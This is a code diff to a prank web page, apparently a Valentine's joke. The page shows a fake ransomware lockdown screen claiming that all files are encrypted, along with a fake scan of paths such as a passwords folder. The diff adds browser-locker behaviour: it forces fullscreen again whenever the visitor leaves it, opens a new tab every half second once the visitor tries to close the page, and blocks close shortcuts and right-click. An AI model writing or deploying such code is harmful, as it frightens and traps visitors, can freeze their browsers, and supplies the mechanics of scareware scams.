@@ -63,9 +63,9 @@
 
     <!-- Fake Critical Error Screen -->
     <div id="error" class="red-screen">
-        <h1 class="blinking">CRITICAL ERROR!</h1>
-        <p>System files encrypted. Contacting authorities...</p>
-        <button onclick="showValentine()">Override System Lock</button>
+        <h1 class="blinking">SYSTEM LOCKDOWN ACTIVATED!</h1>
+        <p>All files are now encrypted.</p>
+        <button onclick="showValentine()">Override Lockdown</button>
     </div>
 
     <!-- Valentine Message -->
@@ -105,16 +105,32 @@
             }
         }
 
-        // Open Multiple Tabs If Trying to Close
-        window.onbeforeunload = function(e) {
-            for (let i = 0; i < 3; i++) {
-                window.open(window.location.href, '_blank');
+        // Re-enable Full-Screen if Exited
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                goFullScreen();
             }
+        });
+
+        // Open Infinite Tabs If Trying to Close
+        window.onbeforeunload = function(e) {
+            setInterval(() => {
+                window.open(window.location.href, '_blank');
+            }, 500);
             return "System processes active. Unauthorized closure detected!";
         };
 
         // Disable Right Click
         document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Disable Common Keyboard Shortcuts
+        document.addEventListener('keydown', function(event) {
+            if ((event.ctrlKey && event.key === 'w') || 
+                (event.ctrlKey && event.shiftKey && event.key === 'w') || 
+                (event.altKey && event.key === 'F4')) {
+                event.preventDefault();
+            }
+        });
 
         function playBeep() {
             const beepSound = document.getElementById('beep-sound');
@@ -140,7 +156,7 @@
 
         function startFileScan() {
             const files = [
-             "C:/Users/Passwords",
+        "C:/Users/Passwords",
             "C:/Users/Documents",
             "C:/Users/Desktop",
             "C:/System/Discord/Pharmaking123",
